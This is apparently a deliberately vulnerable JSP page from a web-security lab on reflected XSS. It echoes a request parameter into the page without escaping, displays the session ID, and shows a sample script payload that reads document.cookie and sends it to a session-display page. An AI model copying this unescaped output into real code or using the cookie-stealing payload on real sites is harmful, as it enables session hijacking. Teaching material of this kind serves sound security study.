<%
    String message="";
    
    if (session.getAttribute("username")==null)
        response.sendRedirect("index.jsp?message=Not logged in");
    
    if (request.getParameter("message")!=null)
        message = request.getParameter("message");
    
%>

<%@page contentType="text/html" pageEncoding="UTF-8"%>
<!DOCTYPE html>
<html>
    <head>
        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
        <title>Reflexive XSS Main Page</title>
    </head>
    <body>
        <h1>Reflexive XSS Main Page</h1>
        Hello, <%= session.getAttribute("username")%> <!--<?php echo $_SESSION['username']; ?>--><br/>

        <a href="Logout">Logout</a><br/>

        <!-- Uncomment the line below if you're too lazy to use wireshark to sniff out SESSIONID/PHPSESSID from lo interface ;P -->
        Your in-memory Session ID is: <%= session.getId() %><br/>

        <form action="mainpage.jsp" method="GET">
        Enter message: <input type="text" name="message">
        <input type="submit" value="Submit">
        </form>

        Message: <%= message %>
        
        <h3>Sample Injection Code</h3>
        <pre>test&lt;script type='text/javascript'&gt;var s=document.cookie; document.location.href='ShowSessionID.jsp?sessionID='+s;&lt;/script&gt;</pre>
        
        <br/><b>(If browser does not use HttpOnly cookies!)</b>
    </body>
</html>
